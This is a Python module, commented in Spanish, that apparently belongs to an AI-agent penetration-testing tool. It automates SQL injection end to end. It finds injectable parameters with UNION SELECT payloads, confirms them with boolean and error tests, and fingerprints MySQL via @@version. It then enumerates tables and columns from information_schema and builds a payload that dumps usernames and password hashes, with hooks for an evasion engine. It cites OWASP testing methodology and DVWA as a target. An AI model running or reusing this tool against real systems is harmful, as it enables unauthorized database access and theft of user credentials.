"""Descubrimiento de esquema con VERIFICACIÓN por etapas para SQL injection.

El agente AVERIGUA la estructura de la base de datos enviando consultas y leyendo las respuestas —
nunca asume la tabla ni las columnas— y, como un pentester real (metodología OWASP WSTG-INPV-05),
CONFIRMA cada etapa con técnicas independientes en vez de dar un paso por sentado:

  * Inyección confirmada por varias vías: error-based, boolean-based (diferencial 1=1 vs 1=2) y
    union-based (no una sola señal).
  * Fingerprint del DBMS (@@version) antes de usar sintaxis específica de MySQL.
  * Conteo de columnas validado por ORDER BY y cruzado con UNION.
  * Extracción verificada: se comprueba que lo extraído parezca credenciales (hashes/secretos).

La mecánica es determinista para que un modelo local pequeño sea fiable; la única decisión que
queda para el LLM es cuáles de las columnas descubiertas son las credenciales. Habla con el
exterior por un callback `probe(sql) -> ProbeResult`, que quien lo usa conecta al motor de evasión
y al objetivo, así el descubrimiento no depende de DVWA en concreto."""
from __future__ import annotations

import re
from dataclasses import dataclass, field
from typing import Callable, Optional

_USER_HINTS = ("user", "login", "uname", "name", "email", "mail", "account")
_PASS_HINTS = ("pass", "pwd", "secret", "hash", "token", "credential")
_MAX_COLUMNS = 12
_HASH_RE = re.compile(r"^[0-9a-f]{16,}$", re.IGNORECASE)


@dataclass
class ProbeResult:
    cells: list[list[str]] = field(default_factory=list)
    db_error: bool = False
    blocked: bool = False


@dataclass
class DiscoveryResult:
    injectable: bool = False
    quote: str = ""
    columns: int = 0
    reflected: list[int] = field(default_factory=list)
    techniques: list[str] = field(default_factory=list)  # técnicas que confirmaron la inyección
    dbms: str = ""                                        # @@version detectado
    tables: list[str] = field(default_factory=list)
    target_table: str = ""
    cred_columns: tuple[str, str] = ("", "")
    extracted: list[dict[str, str]] = field(default_factory=list)
    verified: bool = False                               # la extracción parece credenciales reales
    final_payload: str = ""
    trace: list[str] = field(default_factory=list)


Probe = Callable[[str], ProbeResult]
Picker = Callable[[str, list[str]], Optional[tuple[str, str]]]


def _hexlit(s: str) -> str:
    return "0x" + s.encode("utf-8").hex()


def _best_match(columns: list[str], hints: tuple[str, ...]) -> str:
    for c in columns:
        if c.lower() in hints:
            return c
    for c in columns:
        cl = c.lower()
        if any(h in cl for h in hints) and "id" not in cl:
            return c
    return ""


def pick_credential_columns(table: str, columns: list[str]) -> Optional[tuple[str, str]]:
    user_col = _best_match(columns, _USER_HINTS)
    pass_col = _best_match(columns, _PASS_HINTS)
    if user_col and pass_col and user_col != pass_col:
        return user_col, pass_col
    return None


class SchemaDiscovery:
    def __init__(self, probe: Probe, say: Optional[Callable[[str], None]] = None,
                 pick: Picker = pick_credential_columns) -> None:
        self.probe = probe
        self.say = say or (lambda _m: None)
        self.pick = pick

    def _log(self, res: DiscoveryResult, msg: str) -> None:
        res.trace.append(msg)
        self.say(f"[Descubrimiento] {msg}")

    def discover(self) -> DiscoveryResult:
        res = DiscoveryResult()
        baseline = self.probe("1")  # respuesta normal (sin inyección), para el test diferencial

        # 1. Contexto de comillas + nº de columnas + columnas reflejadas, por BÚSQUEDA UNION.
        #    Robusto: funciona aunque el objetivo NO muestre errores SQL (p. ej. DVWA high, que
        #    ante una consulta inválida simplemente no devuelve filas en vez de mostrar el error).
        for quote in ("'", ""):
            for n in range(1, _MAX_COLUMNS + 1):
                sents = [str(1000 + i) for i in range(n)]
                r = self.probe(f"-1{quote} UNION SELECT {','.join(sents)}-- -")
                flat = {c for row in r.cells for c in row}
                hit = [i for i, s in enumerate(sents, start=1) if s in flat]
                if hit:
                    res.injectable, res.quote, res.columns, res.reflected = True, quote, n, hit
                    break
            if res.injectable:
                break
        self._log(res, f"inyectable={res.injectable} comillas={res.quote!r} "
                       f"columnas={res.columns} reflejadas={res.reflected} (UNION)")
        if not res.injectable:
            return res
        res.techniques.append("union-based")
        q = res.quote

        # 2. VERIFICAR la inyección con técnicas independientes (OWASP WSTG-INPV-05).
        self._confirm_injection(res, q, baseline)

        # 3. Fingerprint del DBMS antes de usar sintaxis específica de MySQL.
        self._fingerprint(res)

        # 5. Enumerar las tablas de la base de datos actual.
        res.tables = self._col0(self._single(res, "table_name",
            " FROM information_schema.tables WHERE table_schema=database()"))
        self._log(res, f"tablas={res.tables}")

        # 6. Por cada tabla, leer sus columnas y decidir si tiene credenciales.
        for table in res.tables or [""]:
            cols = self._col0(self._single(res, "column_name",
                f" FROM information_schema.columns WHERE table_name={_hexlit(table)}")) if table else []
            picked = self.pick(table, cols)
            self._log(res, f"columnas de {table!r}={cols} -> credenciales={picked}")
            if picked:
                res.target_table, res.cred_columns = table, picked
                break
        return res

    def _confirm_injection(self, res: DiscoveryResult, q: str, baseline: ProbeResult) -> None:
        """Confirma la inyección por vías independientes y registra la evidencia (OWASP WSTG)."""
        if self.probe(f"1{q}").db_error:
            res.techniques.append("error-based")
        true_r = self.probe(f"1{q} AND 1=1-- -")
        false_r = self.probe(f"1{q} AND 1=2-- -")
        if true_r.cells and not false_r.cells:
            res.techniques.append("boolean-based")
        # cross-check del nº de columnas con ORDER BY (solo si el objetivo muestra errores)
        if self.probe(f"1{q} ORDER BY {res.columns + 1}-- -").db_error:
            res.trace.append(f"nº de columnas {res.columns} validado por ORDER BY")
        self._log(res, f"inyección confirmada por: {res.techniques}")

    def _fingerprint(self, res: DiscoveryResult) -> None:
        """Detecta el motor de base de datos con @@version."""
        ver = self._col0(self._single(res, "@@version"))
        res.dbms = ver[0] if ver else ""
        low = res.dbms.lower()
        kind = ("MariaDB" if "maria" in low else "MySQL" if ("mysql" in low or low[:1].isdigit())
                else (res.dbms or "desconocido"))
        self._log(res, f"DBMS={kind} (version={res.dbms!r})")

    def build_dump_payload(self, res: DiscoveryResult) -> str:
        user_col, pass_col = res.cred_columns
        return self._pair(res, user_col, pass_col, f" FROM {res.target_table}")

    def extract(self, payload: str, res: DiscoveryResult) -> list[dict[str, str]]:
        r = self.probe(payload)
        rows = [{"username": row[0], "hash": row[1]} for row in r.cells if len(row) >= 2]
        res.final_payload = payload
        res.extracted = rows
        self._verify_extraction(res)
        return rows

    def _verify_extraction(self, res: DiscoveryResult) -> None:
        """Comprueba que lo extraído parezca credenciales (hash o secreto no trivial)."""
        rows = res.extracted
        plausible = [
            r for r in rows
            if r.get("hash") and r["hash"] != r.get("username")
            and (_HASH_RE.match(r["hash"]) or len(r["hash"]) >= 4)
        ]
        res.verified = bool(rows) and len(plausible) >= max(1, len(rows) // 2)
        self._log(res, f"extracción verificada={res.verified} "
                       f"({len(plausible)}/{len(rows)} con credenciales plausibles)")

    def run(self) -> DiscoveryResult:
        res = self.discover()
        if res.cred_columns[0]:
            self.extract(self.build_dump_payload(res), res)
        return res

    # --- constructores de payload: ponen la(s) expresión(es) en la(s) posición(es) reflejada(s) ---

    def _single(self, res: DiscoveryResult, expr: str, from_clause: str = "") -> str:
        pos = res.reflected[0] if res.reflected else 1
        slots = [expr if i == pos else str(i) for i in range(1, res.columns + 1)]
        return f"-1{res.quote} UNION SELECT {','.join(slots)}{from_clause}-- -"

    def _pair(self, res: DiscoveryResult, e1: str, e2: str, from_clause: str = "") -> str:
        p1 = res.reflected[0]
        p2 = res.reflected[1] if len(res.reflected) > 1 else res.reflected[0]
        slots = []
        for i in range(1, res.columns + 1):
            slots.append(e1 if i == p1 else e2 if i == p2 else str(i))
        return f"-1{res.quote} UNION SELECT {','.join(slots)}{from_clause}-- -"

    def _col0(self, payload: str) -> list[str]:
        r = self.probe(payload)
        return [row[0] for row in r.cells if row]
